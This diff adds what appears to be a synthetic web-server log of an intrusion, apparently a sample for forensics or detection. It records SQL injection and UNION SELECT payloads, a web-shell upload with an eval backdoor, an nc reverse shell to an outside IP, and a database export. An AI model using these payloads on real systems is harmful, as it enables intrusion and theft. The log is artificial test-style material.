@@ -1,0 +1,10 @@
+192.168.1.50 - - [17/Aug/2026:01:10:05 +0000] "GET /index.php HTTP/1.1" 200 4520 "Mozilla/5.0"
+45.142.122.8 - - [17/Aug/2026:01:12:30 +0000] "GET /login.php?user=admin'%20OR%20'1'='1'-- HTTP/1.1" 500 120 "-"
+45.142.122.8 - - [17/Aug/2026:01:12:35 +0000] "GET /products.php?id=-1%20UNION%20SELECT%201,username,password,4%20FROM%20users-- HTTP/1.1" 200 8920 "-"
+45.142.122.8 - - [17/Aug/2026:01:13:10 +0000] "POST /api/upload.php HTTP/1.1" 200 450 "CVE-2023-34362 Exploit PoC"
+[17-Aug-2026 01:13:12 UTC] PHP Warning: File created in /var/www/html/uploads/b374k.php (MD5: 8b1a9953c4611296a827abf8c47804d7)
+45.142.122.8 - - [17/Aug/2026:01:13:45 +0000] "POST /uploads/b374k.php?cmd=whoami HTTP/1.1" 200 15 "Mozilla/5.0"
+[17-Aug-2026 01:14:02 UTC] PHP Notice: WebShell execution: <?php eval($_POST['cmd']); ?> executed by www-data
+45.142.122.8 - - [17/Aug/2026:01:14:30 +0000] "POST /uploads/b374k.php HTTP/1.1" 200 1250 "cmd=nc -e /bin/bash 45.142.122.8 4444"
+[17-Aug-2026 01:15:00 UTC] ALERT: Outbound reverse shell connection established from 192.168.1.10:54232 to 45.142.122.8:4444
+45.142.122.8 - - [17/Aug/2026:01:16:15 +0000] "GET /admin/db_export.php?token=unauthorized_override HTTP/1.1" 200 9482012 "Mozilla/5.0"
